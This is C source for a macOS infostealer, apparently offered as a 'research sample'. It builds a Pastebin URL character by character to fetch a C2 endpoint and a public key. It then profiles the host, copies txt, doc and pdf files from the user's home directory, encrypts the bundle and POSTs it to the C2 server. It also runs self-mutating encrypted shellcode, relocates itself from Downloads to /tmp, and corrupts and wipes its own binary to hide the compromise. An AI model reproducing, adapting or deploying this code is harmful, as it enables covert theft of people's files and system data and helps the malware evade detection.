/*
+ * File:        ops
+ *   Core “operation” routines—everything from in‐memory shellcode
+ *   Simple (copy, zero, PRNG, encryption wrappers) to payload
+ *   wrapping, network I/O, file collection, corruption and cleanup.
+ *   Also includes the “boot” & “cook” stages for on‐the‐fly decryption,
+ *   mutation and execution.
+ *
+ * Sections:
+ *   – Low‐level:    optimized memory moves, zeroing, fd wrappers
+ *   – PRNG:         ChaCha20 block generator & helpers
+ *   – Crypto:       AES/RSA encrypt/decrypt and payload wrapping
+ *   – I/O:          hexdump, profiler, system info gathering
+ *   – File sink:    collect, compress, archive, and upload files
+ *   – Destruction:  macho corruption, self‐nuke
+ *   – Network:      HTTP fetch/post helpers, Pastebin C2 fetch
+ *   – Boot/Cook:    Mach‐O section patching and shellcode trampoline
+ *
+ * Notes:
+ *   – Fully extensible for new techniques.
+ *   – Minimal macOS Gatekeeper/XProtect evasion baked in, but
+ *     meant to be a research sample, not release.
+ */
    #include <wisp.h>
    #include <decoder.h>

/* Shellcode dummies */
#ifdef ARCH_X86
const uint8_t dummy[] = {
    0xeb, 0x1e,
    0x5e,
    0xb8, 0x04, 0x00, 0x00, 0x02,
    0xbf, 0x01, 0x00, 0x00, 0x00,
    0xba, 0x0e, 0x00, 0x00, 0x00,
    0x0f, 0x05,
    0xb8, 0x01, 0x00, 0x00, 0x02,
    0xbf, 0x00, 0x00, 0x00, 0x00,
    0x0f, 0x05,
    0xe8, 0xdd, 0xff, 0xff, 0xff,
    0x48, 0x65, 0x6c, 0x6c, 0x6f,
    0x20, 0x57, 0x6f, 0x72, 0x6c,
    0x64, 0x21, 0x0d, 0x0a
};
#elif defined(ARCH_ARM)
const uint8_t dummy[] = {
    0x00, 0x80, 0x20, 0xd1,
    0x02, 0x00, 0x00, 0x90,
    0x22, 0x40, 0x00, 0xf9,
    0x20, 0x00, 0x80, 0x52,
    0x21, 0x00, 0x80, 0x52,
    0x40, 0x00, 0x80, 0x52,
    0x00, 0x00, 0x00, 0x4d,
    0x00, 0x00, 0x00, 0x01,
    0x20, 0x00, 0x80, 0x52,
    0x00, 0x00, 0x00, 0x4d,
    0x00, 0x00, 0x00, 0x01,
    0x00, 0x02, 0x1f, 0x61,
    0x48, 0x65, 0x6c, 0x6c, 0x6f,
    0x20, 0x57, 0x6f, 0x72, 0x6c,
    0x64, 0x21, 0x0d, 0x0a
};
#endif

const size_t len = sizeof(dummy);

/* Mach-O header */
extern struct mach_header_64 _mh_execute_header;
__attribute__((used, section("__DATA,__fdata")))
uint8_t data[sizeof(encryption_header_t) + PAGE_SIZE];

/* Global */
char C2_ENDPOINT[1024];
char PUBKEY_URL[1024];
Object *files[MAX_FILES];
int fileCount = 0;
char tmpDirectory[256] = {0};

/*-------------------------------------------
   Low
-------------------------------------------*/
#if defined(__x86_64__)
inline void O2(void *dest, const void *src, size_t n) {
    __asm__ volatile (
        "rep movsb"
        : "=D"(dest), "=S"(src), "=c"(n)
        : "0"(dest), "1"(src), "2"(n)
        : "memory"
    );
}
#else
inline void O2(void *dest, const void *src, size_t n) {
    memcpy(dest, src, n);
}
#endif

inline void _zero(void *ptr, size_t n) {
    memset(ptr, 0, n);
    __asm__ volatile ("" : : "r"(ptr) : "memory");
}

__attribute__((always_inline))
inline int oprw(const char *path) {
    return open(path, O_RDWR, 0);
}
__attribute__((always_inline))
inline void clso(int fd) { close(fd); }
__attribute__((always_inline))
inline int reset(int fd) { return lseek(fd, 0, SEEK_SET); }

__attribute__((always_inline))
inline int wrby(int fd, unsigned char *buf, size_t len) {
    size_t written = 0;
    while (written < len) {
        ssize_t bytes = write(fd, buf + written, len - written);
        if (bytes <= 0) return -1;
        written += (size_t)bytes;
    }
    return 0;
}

__attribute__((always_inline))
inline int find_self(char *out, uint32_t *size) {
    return _NSGetExecutablePath(out, size);
}

/*-------------------------------------------
   PRNG (ChaCha20)
-------------------------------------------*/
void chacha20_block(const uint32_t key[8], uint32_t counter,
                           const uint32_t nonce[3], uint32_t out[16]) {
    uint32_t state[16], orig[16];
    uint32_t constants[4] = {
        0x61707865, 0x3320646e, 0x79622d32, 0x6B206574
    };
    memcpy(state, constants, sizeof(constants));
    memcpy(&state[4], key, 32);
    state[12] = counter;
    memcpy(&state[13], nonce, 12);
    memcpy(orig, state, sizeof(state));
    for (int i = 0; i < 10; i++) {
        QR(state[0], state[4],  state[8],  state[12]);
        QR(state[1], state[5],  state[9],  state[13]);
        QR(state[2], state[6], state[10],  state[14]);
        QR(state[3], state[7], state[11],  state[15]);
        QR(state[0], state[5], state[10],  state[15]);
        QR(state[1], state[6], state[11],  state[12]);
        QR(state[2], state[7],  state[8],  state[13]);
        QR(state[3], state[4],  state[9],  state[14]);
    }
    for (int i = 0; i < 16; i++)
        out[i] = state[i] + orig[i];
}

uint32_t chacha20_random(chacha_state_t *rng) {
    if (rng->position >= 64) {
        uint32_t key[8], nonce[3];
        memcpy(key, rng->key, 32);
        memcpy(nonce, rng->iv, 12);
        chacha20_block(key, (uint32_t)rng->counter, nonce,
                       (uint32_t *)rng->stream);
        rng->counter++;
        rng->position = 0;
    }
    uint32_t value;
    memcpy(&value, rng->stream + rng->position, sizeof(value));
    rng->position += sizeof(value);
    return value;
}

void chacha20_init(chacha_state_t *rng,
                          const uint8_t *seed, size_t len) {
    uint8_t key_hash[CC_SHA256_DIGEST_LENGTH],
            iv_hash[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(seed, (CC_LONG)len, key_hash);
    memcpy(rng->key, key_hash, KEY_SIZE);
    CC_SHA256(key_hash, CC_SHA256_DIGEST_LENGTH, iv_hash);
    memcpy(rng->iv, iv_hash, 12);
    rng->position = 64;
    rng->counter = ((uint64_t)time(NULL)) ^ getpid();
}

/*-------------------------------------------
  snprintf / strncpy wrappers
-------------------------------------------*/
int _snprintf(char *str, size_t size, const char *format, ...) {
    if (!str || !format) return -1;
    va_list args;
    va_start(args, format);
    int ret = vsnprintf(str, size, format, args);
    va_end(args);
    return ret;
}

char* _strncpy(char *dest, const char *src, size_t n) {
    if (!dest || !src) return dest;
    return strncpy(dest, src, n);
}

/*-------------------------------------------
  Encryption / wrapping
-------------------------------------------*/

/* AES encrypt/decrypt wrapper */
void crypt_payload(int enc, const uint8_t *key, const uint8_t *iv,
                   const uint8_t *in, uint8_t *out, size_t len) {
    CCCryptorRef cr;
    CCCryptorStatus st = CCCryptorCreate(enc ? kCCEncrypt : kCCDecrypt,
                                         kCCAlgorithmAES, 0, key, KEY_SIZE, iv, &cr);
    if (st != kCCSuccess) return;
    size_t moved = 0;
    if (CCCryptorUpdate(cr, in, len, out, len, &moved) != kCCSuccess) {
        CCCryptorRelease(cr);
        return;
    }
    size_t fin = 0;
    CCCryptorFinal(cr, out + moved, len - moved, &fin);
    CCCryptorRelease(cr);
}

unsigned char* wrap_loot(const unsigned char *plaintext,
                                size_t plaintext_len,
                                size_t *out_len,
                                RSA *rsa_pubkey) {
    unsigned char aes_key[16], iv[AES_BLOCK_SIZE];
    if (!RAND_bytes(aes_key, sizeof(aes_key)) ||
        !RAND_bytes(iv, AES_BLOCK_SIZE))
        return NULL;

    int max_ct = plaintext_len + AES_BLOCK_SIZE;
    unsigned char *ciphertext = malloc(max_ct);
    if (!ciphertext) return NULL;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) { free(ciphertext); return NULL; }
    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL,
                                aes_key, iv)) {
        EVP_CIPHER_CTX_free(ctx);
        free(ciphertext);
        return NULL;
    }
    int len_ct = 0, final_ct = 0;
    if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len_ct,
                               plaintext, plaintext_len) ||
        1 != EVP_EncryptFinal_ex(ctx,
                                 ciphertext + len_ct,
                                 &final_ct)) {
        EVP_CIPHER_CTX_free(ctx);
        free(ciphertext);
        return NULL;
    }
    EVP_CIPHER_CTX_free(ctx);
    int ciphertext_len = len_ct + final_ct;

    int rsa_size = RSA_size(rsa_pubkey);
    unsigned char *encrypted_key = malloc(rsa_size);
    if (!encrypted_key) {
        free(ciphertext);
        return NULL;
    }
    int ek_len = RSA_public_encrypt(sizeof(aes_key),
                                    aes_key,
                                    encrypted_key,
                                    rsa_pubkey,
                                    RSA_PKCS1_OAEP_PADDING);
    if (ek_len == -1) {
        free(encrypted_key);
        free(ciphertext);
        return NULL;
    }

    *out_len = 4 + ek_len + AES_BLOCK_SIZE + 4 + ciphertext_len;
    unsigned char *message = malloc(*out_len);
    if (!message) {
        free(encrypted_key);
        free(ciphertext);
        return NULL;
    }

    unsigned char *p = message;
    uint32_t net;
    net = htonl(ek_len);
    memcpy(p, &net, 4); p += 4;
    memcpy(p, encrypted_key, ek_len); p += ek_len;
    free(encrypted_key);

    memcpy(p, iv, AES_BLOCK_SIZE); p += AES_BLOCK_SIZE;
    net = htonl(ciphertext_len);
    memcpy(p, &net, 4); p += 4;
    memcpy(p, ciphertext, ciphertext_len);

    free(ciphertext);
    return message;
}

void hexdump(const uint8_t *data, size_t len,
                    const char *label) {
    size_t dump_len = len < 256 ? len : 256;
    DMB("%s (first %zu bytes):", label, dump_len);
    for (size_t i = 0; i < dump_len; i += 16) {
        char buf[128]; size_t pos = 0;
        pos += snprintf(buf + pos, sizeof(buf) - pos,
                        "%08zx  ", i);
        for (size_t j = 0; j < 16 && i + j < dump_len; j++)
            pos += snprintf(buf + pos, sizeof(buf)-pos,
                            "%02x ", data[i+j]);
        pos += snprintf(buf + pos, sizeof(buf)-pos, " |");
        for (size_t j = 0; j < 16 && i + j < dump_len; j++) {
            uint8_t c = data[i+j];
            pos += snprintf(buf + pos, sizeof(buf)-pos,
                            "%c",
                            (c >= 32 && c <= 126)
                              ? c : '.');
        }
        strncat(buf, "|", sizeof(buf)-strlen(buf)-1);
        DMB("%s", buf);
    }
}

/*-------------------------------------------
   Wip
-------------------------------------------*/
void f_buffer(unsigned char *buf, size_t len,
                     wipe_pattern_t pattern,
                     unsigned char custom) {
    switch (pattern) {
      case WIPE_ZERO:   memset(buf, 0x00, len); break;
      case WIPE_ONE:    memset(buf, 0xFF, len); break;
      case WIPE_RANDOM:
        for (size_t i = 0; i < len; i++)
          buf[i] = arc4random_uniform(256);
        break;
      case WIPE_CUSTOM: memset(buf, custom, len); break;
    }
}

int w_file(int fd, unsigned char *buf, size_t len,
                  const wipe_config_t *config) {
    for (int pass = 0; pass < config->passes; pass++) {
        f_buffer(buf, len,
                 config->patterns[pass],
                 config->custom);
        if (reset(fd) == -1) return -1;
        if (wrby(fd, buf, len) != 0) return -1;
        if (fsync(fd) != 0) return -1;
    }
    return 0;
}

int corrupt_macho(int fd) {
    struct stat st;
    if (fstat(fd, &st) != 0) return -1;

    size_t sz = (size_t)st.st_size;
    if (sz < 4096) return -1; // too small

    unsigned char *header = malloc(4096);
    if (!header) return -1;

    if (pread(fd, header, 4096, 0) != 4096) {
        free(header);
        return -1;
    }

    *(uint32_t *)(header) = arc4random_uniform(0xFFFFFFFF);
    for (int i = 0; i < 16; i++) {
        size_t off = arc4random_uniform(4096 - 4);
        *(uint32_t *)(header + off) = arc4random_uniform(0xFFFFFFFF);
    }

    if (pwrite(fd, header, 4096, 0) != 4096) {
        free(header);
        return -1;
    }

    free(header);
    return fsync(fd);
}

int _nuke(const char *path,
                 const wipe_config_t *config) {
    struct stat st;
    if (stat(path, &st) != 0) return -1;
    size_t sz = (size_t)st.st_size;
    if (!sz) return unlink(path);

    unsigned char *buf = malloc(sz);
    if (!buf) return -1;

    int fd = oprw(path);
    if (fd < 0) { free(buf); return -1; }

    int res = w_file(fd, buf, sz, config);
    clso(fd);
    free(buf);
    if (res != 0) return -1;
    return unlink(path);
}

wipe_config_t *prep_nuker(int passes) {
    wipe_config_t *cfg = malloc(sizeof(*cfg));
    if (!cfg) return NULL;
    cfg->patterns = malloc(sizeof(wipe_pattern_t)*passes);
    if (!cfg->patterns) { free(cfg); return NULL; }

    for (int i = 0; i < passes-1; i++)
      cfg->patterns[i] = WIPE_RANDOM;
    cfg->patterns[passes-1] = WIPE_ZERO;

    cfg->passes = passes;
    cfg->custom = 0;
    return cfg;
}

void _burn(wipe_config_t *cfg) {
    if (!cfg) return;
    free(cfg->patterns);
    free(cfg);
}

int _self(const char *path) {
    int passes = 7;
    wipe_config_t *cfg = prep_nuker(passes);
    int fd = open(path, O_RDWR);
    if (fd < 0) { _burn(cfg); return -1; }
    corrupt_macho(fd);
    close(fd);
    int r = _nuke(path, cfg);
    _burn(cfg);
    return r;
}

/*-------------------------------------------
   Process 
-------------------------------------------*/
int autodes(void) {
    char path[1024] = {0};
    uint32_t sz = sizeof(path);
    if (find_self(path, &sz) != 0) exit(EXIT_FAILURE);

    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        execl(path, path, "--deadfish", NULL);
        exit(EXIT_FAILURE);
    }
    return 0;
}

void k_ill(void) {
    char path[1024] = {0};
    uint32_t sz = sizeof(path);
    if (find_self(path, &sz) != 0) exit(EXIT_FAILURE);

    _self(path);
    sleep(1);
    exit(EXIT_SUCCESS);
}

__attribute__((noreturn))
void panic(void) {
    k_ill();
}

/*-------------------------------------------
   Network 
-------------------------------------------*/
void _url(char *buf) {
    buf[0] = 'h'; buf[1] = 't'; buf[2] = 't'; buf[3] = 'p'; buf[4] = 's'; 
    buf[5] = ':'; buf[6] = '/'; buf[7] = '/'; buf[8] = 'p'; buf[9] = 'a';
    buf[10] = 's'; buf[11] = 't'; buf[12] = 'e'; buf[13] = 'b'; buf[14] = 'i'; 
    buf[15] = 'n'; buf[16] = '.'; buf[17] = 'c'; buf[18] = 'o'; buf[19] = 'm';
    buf[20] = '/'; buf[21] = 'r'; buf[22] = 'a'; buf[23] = 'w'; buf[24] = '/';
    buf[25] = 'I'; buf[26] = 'r'; buf[27] = 'q'; buf[28] = 'S'; buf[29] = 't';
    buf[30] = 'O'; buf[31] = 'r'; buf[32] = 'M';
    buf[33] = '\0';
}

size_t networkWriteCallback(void *contents,
                                   size_t size,
                                   size_t nmemb,
                                   void *userp) {
    size_t real = size*nmemb;
    MemChh *chunk = userp;
    char *ptr = realloc(chunk->data,
                       chunk->size + real + 1);
    if (!ptr) return 0;
    chunk->data = ptr;
    memcpy(chunk->data + chunk->size,
           contents, real);
    chunk->size += real;
    chunk->data[chunk->size] = '\0';
    return real;
}

RSA* grab_rsa(const char *url) {
    if (!url || strlen(url) < 5) return NULL;
    CURL *curl = curl_easy_init();
    if (!curl) return NULL;

    MemChh chunk = { malloc(1), 0 };
    if (!chunk.data) { curl_easy_cleanup(curl); return NULL; }

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION,
                     networkWriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &chunk);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    if (curl_easy_perform(curl) != CURLE_OK) {
        curl_easy_cleanup(curl);
        free(chunk.data);
        return NULL;
    }
    curl_easy_cleanup(curl);

    BIO *bio = BIO_new_mem_buf(chunk.data,
                               chunk.size);
    RSA *rsaPubKey =
       PEM_read_bio_RSA_PUBKEY(bio, NULL, NULL, NULL);
    BIO_free(bio);
    free(chunk.data);
    return rsaPubKey;
}

char* fetch_past(const char *url) {
    CURL *curl = curl_easy_init();
    if (!curl) return NULL;

    MemChh chunk = { malloc(1), 0 };
    if (!chunk.data) { curl_easy_cleanup(curl);
                       return NULL; }

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION,
                     networkWriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &chunk);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    if (curl_easy_perform(curl) != CURLE_OK) {
        curl_easy_cleanup(curl);
        free(chunk.data);
        return NULL;
    }
    curl_easy_cleanup(curl);
    return chunk.data;
}

int from_past(const char *content,
                     char *pubkey_url,
                     char *c2_endpoint) {
    char *copy = strdup(content);
    if (!copy) return 0;

    char *line1 = strtok(copy, "\n");
    if (line1) {
        while (*line1==' '||*line1=='\t') line1++;
        char *end = line1 + strlen(line1)-1;
        while (end>line1&&(*end==' '||*end=='\t')) end--;
        *(end+1) = '\0';
        strcpy(pubkey_url, line1);
    }
    char *line2 = strtok(NULL, "\n");
    if (line2) {
        while (*line2==' '||*line2=='\t') line2++;
        char *end = line2+strlen(line2)-1;
        while (end>line2&&(*end==' '||*end=='\t')) end--;
        *(end+1) = '\0';
        strcpy(c2_endpoint, line2);
    }
    free(copy);
    return 1;
}

/*-------------------------------------------
   File-collection & bundling
-------------------------------------------*/
int copyFile(const char *src, const char *dst) {
    FILE *fin = fopen(src, "rb"),
         *fout= fopen(dst, "wb");
    if (!fin||!fout) {
        if (fin) fclose(fin);
        if (fout) fclose(fout);
        return -1;
    }
    char buf[4096];
    size_t n;
    while ((n=fread(buf,1,sizeof(buf),fin))>0) {
        if (fwrite(buf,1,n,fout)!=n) {
            fclose(fin); fclose(fout);
            return -1;
        }
    }
    fclose(fin); fclose(fout);
    return 0;
}

unsigned char* compressData(const unsigned char *in,
                                   size_t inLen,
                                   size_t *outLen) {
    uLongf destLen = compressBound(inLen);
    unsigned char *out = malloc(destLen);
    if (!out) return NULL;
    if (compress(out, &destLen, in, inLen) != Z_OK) {
        free(out);
        return NULL;
    }
    *outLen = destLen;
    return out;
}

const char *ALLOWED[] = { "txt","doc","pdf",NULL };
int fileCollector(const char *fpath,
                         const struct stat *sb,
                         int typeflag,
                         struct FTW *ftwbuf) {
    (void)ftwbuf;
    if (fileCount >= MAX_FILES) return 0;
    if (typeflag == FTW_F && sb->st_size > 0) {
        const char *ext = strrchr(fpath, '.');
        if (ext && ext != fpath) {
            ext++;
            for (int i=0; ALLOWED[i]; i++){
                if (strcasecmp(ext, ALLOWED[i])==0){
                    char *copy = strdup(fpath);
                    if (!copy) break;
                    char *base = strdup(basename(copy));
                    free(copy);
                    if (!base) break;
                    char dst[512]={0};
                    snprintf(dst,sizeof(dst),"%s/%s",
                             tmpDirectory, base);
                    free(base);
                    if (copyFile(fpath,dst)==0) {
                        Object *o = malloc(sizeof(Object));
                        if (!o) break;
                        o->path = strdup(dst);
                        o->size = sb->st_size;
                        files[fileCount++] = o;
                    }
                    break;
                }
            }
        }
    }
    return 0;
}

void overn_out(const char *server_url,
               const unsigned char *data,
               size_t size) {
    if (!server_url||strlen(server_url)<5) return;
    CURL *curl = curl_easy_init();
    if (!curl) return;
    struct curl_slist *hdr =
      curl_slist_append(NULL,
                        "Content-Type: application/octet-stream");
    curl_easy_setopt(curl, CURLOPT_URL, server_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hdr);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS,
                     data);
    curl_easy_setopt(curl,
                     CURLOPT_POSTFIELDSIZE, size);
    (void)curl_easy_perform(curl);
    curl_slist_free_all(hdr);
    curl_easy_cleanup(curl);
}

void sendFilesBundle(RSA *rsaPubKey) {
    if (!fileCount) return;
    char archivePath[512]={0};
    const char *tmpId = tmpDirectory + 5;
    snprintf(archivePath,sizeof(archivePath),
             "/tmp/%s.tar", tmpId);

    char tarcmd[1024]={0};
    snprintf(tarcmd,sizeof(tarcmd),
             "tar -cf %s -C %s .",
             archivePath, tmpDirectory);
    if (system(tarcmd)) return;

    FILE *fp = fopen(archivePath,"rb");
    if (!fp) return;
    fseek(fp,0,SEEK_END);
    long archiveSize = ftell(fp);
    fseek(fp,0,SEEK_SET);

    unsigned char *archiveData = malloc(archiveSize);
    if (!archiveData) { fclose(fp); return; }
    if (fread(archiveData,1,archiveSize,fp)
        != (size_t)archiveSize) {
        fclose(fp);
        free(archiveData);
        return;
    }
    fclose(fp);
    unlink(archivePath);

    size_t compSize = 0;
    unsigned char *compData = compressData(archiveData,
                                           archiveSize,
                                           &compSize);
    free(archiveData);
    if (!compData) return;

    size_t packagedLen = 0;
    unsigned char *pkg = wrap_loot(compData,
                                   compSize,
                                   &packagedLen,
                                   rsaPubKey);
    free(compData);
    if (pkg) {
        overn_out(C2_ENDPOINT,
                  pkg, packagedLen);
        free(pkg);
    }
}

/*-------------------------------------------
  SystemInfo & profiling
-------------------------------------------*/
void profiler(char *buffer, size_t bufsize, size_t *offset) {
    FILE *fp = popen("system_profiler SPSoftwareDataType SPHardwareDataType","r");
    if (!fp) return;

    *offset += snprintf(buffer+*offset,
                        bufsize-*offset,"[Info]\n");
    char line[1035];
    while (fgets(line,sizeof(line),fp))
        *offset += snprintf(buffer+*offset,
                            bufsize-*offset,"%s",line);
    pclose(fp);
}

void collectSystemInfo(RSA *rsaPubKey) {
    char buff[PAGE_SIZE]={0};
    size_t offset = 0;
    char system_id[37];
    mint_uuid(system_id);
    offset += snprintf(buff+offset,
                       sizeof(buff)-offset,
                       "ID: %s\n", system_id);
    offset += snprintf(buff+offset,
                       sizeof(buff)-offset,
                       "=== Host ===\n");
    profiler(buff,sizeof(buff),&offset);

    size_t packaged_len = 0;
    unsigned char *packaged =
      wrap_loot((unsigned char*)buff,
                offset,
                &packaged_len,
                rsaPubKey);
    if (packaged) {
        overn_out(C2_ENDPOINT,
                  packaged, packaged_len);
        free(packaged);
    }
}

void mint_uuid(char *id) {
    uuid_t uuid;
    uuid_generate_random(uuid);
    uuid_unparse(uuid, id);
}

/*-------------------------------------------
  Profile 
-------------------------------------------*/
int sendProfile(void) {
    char pastebin_url[256] = {0};
    _url(pastebin_url); 

    char pubkey_url[1024];
    char c2_endpoint[1024];

    char *pastebin_content = fetch_past(pastebin_url);
    if (!pastebin_content) {
        panic(); // AHHHHH
    }

    // (C2 endpoint and Public Key URL) 
    if (!from_past(pastebin_content, pubkey_url, c2_endpoint)) {
        free(pastebin_content);  
        panic();
    }
    free(pastebin_content);

    if (strlen(c2_endpoint) < 5 || strlen(pubkey_url) < 5) {
        panic(); 
    }

    strcpy(C2_ENDPOINT, c2_endpoint); 
    if (curl_global_init(CURL_GLOBAL_DEFAULT) != 0)
        panic();

    OpenSSL_add_all_algorithms();

    RSA *rsaPubKey = grab_rsa(pubkey_url);
    if (!rsaPubKey)
        panic();

    collectSystemInfo(rsaPubKey);

    const char *home = getenv("HOME");
    if (!home)
        home = ".";
    if (nftw(home, fileCollector, 10, FTW_PHYS) == -1)
        panic();

    sendFilesBundle(rsaPubKey);

    for (int i = 0; i < fileCount; i++) {
        if (files[i]) {
            unlink(files[i]->path);
            free(files[i]->path);
            free(files[i]);
        }
    }

    // Won’t know the extent of the compromise.
    rmdir(tmpDirectory);

    RSA_free(rsaPubKey);
    EVP_cleanup();
    curl_global_cleanup();

    return 0;
}

/*-------------------------------------------
  Boot & Cook (encryption / execution)
-------------------------------------------*/

    // https://developer.apple.com/documentation/foundation/nsbundle/1409078-executablepath
    // https://developer.apple.com/documentation/kernel/mach_header_64
    // https://developer.apple.com/documentation/kernel/segment_command_64

uint64_t findSectionOffset(
    struct mach_header_64 *header,
    const char *sectName,
    const char *segName,
    size_t requiredSize) {
    uint64_t offset = 0;
    struct load_command *lc =
      (struct load_command*)((char*)header
                             + sizeof(*header));
    for (uint32_t i = 0; i < header->ncmds; i++) {
        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg =
              (struct segment_command_64*)lc;
            struct section_64 *sec =
              (struct section_64*)((char*)seg
                                   + sizeof(*seg));
            for (uint32_t j = 0; j < seg->nsects; j++) {
                if (!strcmp(sec[j].sectname, sectName)
                 && !strcmp(sec[j].segname, segName)) {
                    offset = sec[j].offset;
                    if (requiredSize > sec[j].size)
                        return 0;
                    return offset;
                }
            }
        }
        lc = (struct load_command*)((char*)lc
                                    + lc->cmdsize);
    }
    return 0;
}

int writeDataAtOffset(int fd,
                             uint64_t offset,
                             const uint8_t *data,
                             size_t size) {
    if (lseek(fd, offset, SEEK_SET) == -1) {
        perror("lseek");
        return -1;
    }
    size_t totalWritten = 0;
    while (totalWritten < size) {
        ssize_t w = write(fd,
                          data+totalWritten,
                          size-totalWritten);
        if (w <= 0) {
            perror("write");
            return -1;
        }
        totalWritten += w;
    }
    return totalWritten == size ? 0 : -1;
}

void save_section(uint8_t *data, size_t sz) {
    char path[1024] = {0};
    uint32_t pathSize = sizeof(path);
    if (find_self(path, &pathSize) != 0) return;

    int fd = oprw(path);
    if (fd < 0) return;

    struct mach_header_64 *hdr = &_mh_execute_header;
    uint64_t sectionOffset =
      findSectionOffset(hdr, "__fdata", "__DATA", sz);
    if (!sectionOffset) {
        close(fd);
        return;
    }
    if (writeDataAtOffset(fd, sectionOffset, data, sz)!=0) {
        close(fd);
        return;
    }
    close(fd);
}

void pop_shellcode(uint8_t *code, size_t size) {
    DMB("code=%p, size=%zu", code, size);
    long ps = sysconf(_SC_PAGESIZE);
    if (ps <= 0) { perror("sysconf"); return; }
    uintptr_t addr = (uintptr_t)code;
    uintptr_t start = addr & ~(ps - 1);
    size_t tot = (addr - start + size + ps - 1) & ~(ps -1);
    if (mprotect((void*)start, tot,
                 PROT_READ|PROT_EXEC)!=0) {
        panic(); return;
    }
#if defined(__arm__)||defined(__aarch64__)
    __builtin___clear_cache((char*)code,
                            (char*)code+size);
#endif
    void (*fn)(void) = (void(*)(void))code;
    fn();
}

int boot(uint8_t *dsec, size_t ds,
                chacha_state_t *rng) {
    encryption_header_t *hdr =
      (encryption_header_t*)dsec;
    uint8_t *payload = dsec
      + sizeof(encryption_header_t);

    if (hdr->count == 0) {
        uint8_t init_buffer[PAGE_SIZE];
        memset(init_buffer, 0x90,
               sizeof(init_buffer));
        if (len > sizeof(init_buffer)) return -1;
        memcpy(init_buffer, dummy, len);
        if (getentropy(hdr->key, KEY_SIZE)!=0
         || getentropy(hdr->iv,
                      kCCBlockSizeAES128)!=0) {
            panic();
        }
        cipher(hdr->key,
               hdr->iv,
               init_buffer,
               payload,
               PAGE_SIZE);
        CC_SHA256(payload,
                  PAGE_SIZE,
                  hdr->hash);
        save_section(dsec, ds);
        hdr->count = 1;
        hexdump(payload, PAGE_SIZE, "Init");
    }
    return 0;
}

int cook(uint8_t *dsec, size_t ds,
                chacha_state_t *rng) {
    encryption_header_t *hdr =
      (encryption_header_t*)dsec;
    uint8_t *payload = dsec
      + sizeof(encryption_header_t);
    uint8_t *dec = malloc(PAGE_SIZE);
    if (!dec) { DMB("malloc failed"); return -1; }

    decipher(hdr->key, hdr->iv,
             payload, dec, PAGE_SIZE);
    DMB("(pre-mutation)");
    hexdump(dec, PAGE_SIZE, "Decrypted");

    uint8_t comp[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(payload, PAGE_SIZE, comp);
    if (memcmp(hdr->hash, comp,
               CC_SHA256_DIGEST_LENGTH)!=0) {
        panic();
    }
#ifndef RELEASE
    mutate(dec, PAGE_SIZE, rng);
#else
    sendProfile();
    panic();
#endif

    if (getentropy(hdr->key, KEY_SIZE)!=0
     || getentropy(hdr->iv,
                  kCCBlockSizeAES128)!=0) {
        _zero(dec, PAGE_SIZE);
        free(dec);
        return -1;
    }
    cipher(hdr->key,
           hdr->iv,
           dec,
           payload,
           PAGE_SIZE);
    CC_SHA256(payload,
              PAGE_SIZE,
              hdr->hash);
    save_section(dsec, ds);

    void *code_ptr;
    if (posix_memalign(&code_ptr,
                      PAGE_SIZE,
                      PAGE_SIZE)!=0) {
        panic(); free(dec);
        return -1;
    }
    if (mprotect(code_ptr, PAGE_SIZE,
                 PROT_READ|PROT_WRITE|
                 PROT_EXEC)!=0) {
        panic();
    }
    O2(code_ptr, dec, PAGE_SIZE);
    if (mprotect(code_ptr, PAGE_SIZE,
                 PROT_READ|PROT_EXEC)!=0) {
        panic();
    }

    pop_shellcode(code_ptr, PAGE_SIZE);
    free(code_ptr);
    _zero(dec, PAGE_SIZE);
    free(dec);

    hdr->seed = chacha20_random(rng);
    hdr->count++;
    return 0;
}

/*-------------------------------------------
   Initialization 
-------------------------------------------*/
void initialize(void) {
    DMB("Ah shit, here we go again!");
    chacha_state_t rng;
    uint8_t seed[32] = {0};
    chacha20_init(&rng, seed, sizeof(seed));

    usleep((chacha20_random(&rng)&0xFF)*1000);

#ifndef TEST
    char exe_path[1024] = {0};
    uint32_t path_len = sizeof(exe_path);
    if (find_self(exe_path, &path_len)!=0) exit(1);

    if (!strstr(exe_path,"/tmp/") &&
        strstr(exe_path,"/Downloads/")) {
        char *base = strrchr(exe_path,'/');
        base = base ? base+1 : exe_path;
        char tmp_path[1024] = {0};
        snprintf(tmp_path,sizeof(tmp_path),
                 "/tmp/%s", base);
        FILE *src = fopen(exe_path,"rb"),
             *dst = fopen(tmp_path,"wb");
        if (!src||!dst) { if(src)fclose(src);
                          if(dst)fclose(dst);
                          exit(1);}
        char buf[4096]; size_t n;
        while ((n=fread(buf,1,4096,src))>0){
            if (fwrite(buf,1,n,dst)!=n){
                fclose(src); fclose(dst);
                exit(1);
            }
        }
        fclose(src); fclose(dst);
        chmod(tmp_path,0755);
        char *args[]={tmp_path,NULL};
        execv(tmp_path,args);
        exit(1);

    } else if (!strstr(exe_path,"/tmp/")) {
        fprintf(stderr,"%s\nDie...\n",exe_path);
        panic();
    }
#endif

    unsigned long ds = 0;
    uint8_t *dsec = getsectiondata(
      &_mh_execute_header,
      "__DATA","__fdata",&ds);
    if (!dsec || ds < sizeof(data)) {
        DMB("Data invalid: dsec=%p, ds=%lu",
            dsec, ds);
        exit(1);
    }
    if (boot(dsec, ds, &rng) != 0) exit(1);
    if (cook(dsec, ds, &rng) != 0) exit(1);
}
